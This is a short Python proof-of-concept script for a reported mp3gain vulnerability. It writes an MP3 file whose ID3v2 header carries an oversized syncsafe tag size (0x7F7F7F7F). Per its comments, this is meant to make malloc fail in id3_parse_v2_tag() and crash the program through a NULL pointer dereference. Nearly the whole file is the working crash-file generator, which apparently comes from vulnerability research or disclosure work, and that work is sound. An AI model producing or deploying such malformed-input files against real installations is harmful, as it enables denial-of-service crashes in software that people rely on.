#!/usr/bin/env python3
"""
PoC generator for mp3gain VULN 002:
ID3v2 Tag Size causes malloc failure followed by NULL pointer dereference.

Function: id3_parse_v2_tag() in id3tag.c lines 545-546
CWE: CWE-476 (NULL Pointer Dereference)
"""

import struct
import os

output_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.mp3")

# ID3v2 header: 10 bytes total
# - Magic: b"ID3"
# - Version: [0x03, 0x00] (ID3v2.3)
# - Flags: 0x00
# - Size: 4 syncsafe bytes
#
# Syncsafe integer: each byte uses only 7 bits (MSB always 0)
# 0x7F7F7F7F syncsafe = (0x7F << 21) | (0x7F << 14) | (0x7F << 7) | 0x7F
#                     = 268,435,455 bytes (~256 MB)
# This triggers malloc(268435455) which may fail on constrained systems,
# leading to NULL dereference when fread() is called with NULL pointer.

magic = b"ID3"
version = bytes([0x03, 0x00])   # ID3v2.3
flags = bytes([0x00])
# Syncsafe size: 4 bytes, each with MSB=0, value 0x7F each
size_bytes = bytes([0x7F, 0x7F, 0x7F, 0x7F])  # syncsafe integer ~268MB

id3_header = magic + version + flags + size_bytes

# Minimal valid-looking MP3 frame sync bytes appended after ID3 header
# MPEG-1, Layer 3, 128kbps, 44100Hz, stereo: 0xFF 0xFB 0x90 0x00
mp3_frame = bytes([0xFF, 0xFB, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00])

payload = id3_header + mp3_frame

with open(output_file, "wb") as f:
    f.write(payload)

print(f"[+] Written {len(payload)} bytes to: {output_file}")
print(f"[+] ID3v2 tag size field: 0x7F7F7F7F (syncsafe) = 268,435,455 bytes")
print(f"[+] This should trigger malloc(268435455) in id3_parse_v2_tag()")
print(f"[+] If malloc fails (NULL return), fread(NULL,...) -> SIGSEGV (CWE-476)")
